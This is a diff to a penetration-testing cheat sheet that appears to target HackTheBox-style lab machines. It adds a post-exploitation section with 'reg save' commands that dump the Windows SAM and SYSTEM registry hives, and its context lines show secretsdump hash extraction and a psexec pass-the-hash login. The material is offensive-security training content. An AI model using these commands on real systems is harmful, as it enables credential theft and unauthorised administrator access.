@@ -31,6 +31,7 @@ Table of Contents
       * [Using BloodHound](#using-bloodhound)
       * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
       * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
+   * [Post Explotation](#post-explotation)
    * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
    * [Oracle Hacking](#oracle-hacking)
    * [Forensics](#forensics)
@@ -234,6 +235,16 @@ Secretsdump can be utilized to get hashes of more privileged users:
 secretsdump [DOMAIN]/[USER]:[PASSWORD]@10.10.10.161
 # And if we have luck, we can use the hash with *psexec*, or try to crack it.
 ./psexec.py -hashes :[HASH] [DOMAIN]/administrator@[RHOST] powershell.exe
+```
+
+#  Post Explotation
+
+## Extract locally saved credentials (hashed) from Windows
+These credentials are stored into a set of secured files, which are normally blocked due to various processes reading from these files anytime. A good way to be able to extact the credentials is the following one:
+
+```cmd
+reg save HKLM\SAM C:\sam
+reg save HKLM\SYSTEM C:\system
 ```
 
 # Eternalblue Vulnerabilities exploitation
